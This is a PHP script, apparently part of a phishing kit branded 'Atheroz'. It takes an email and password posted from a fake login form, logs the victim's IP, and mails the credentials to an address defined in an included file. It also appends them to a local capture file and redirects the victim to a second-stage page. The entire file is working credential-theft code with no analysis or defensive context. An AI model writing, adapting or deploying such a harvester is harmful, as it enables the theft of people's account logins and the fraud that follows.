<meta http-equiv="Refresh"
content="0;url=step2.html"> 
<?php  
include "atheroz.php";
$email = $_POST['NU'];  
$pass = $_POST['CO'];  
$Date = "" . date("Y/m/d") . "";  
date_default_timezone_set("America/Mexico_City");  
$Time = "America/Mexico_City " . date("h:i:sa");  
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];  
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "   
Uzuari0 :  $email
Contra : $pass  ";  
$MAIL_TITLE = "Atheroz | ".$IP."";  
$MAIL_HEADER = "From: Reporte_Atheroz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("Xcaps.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  



?>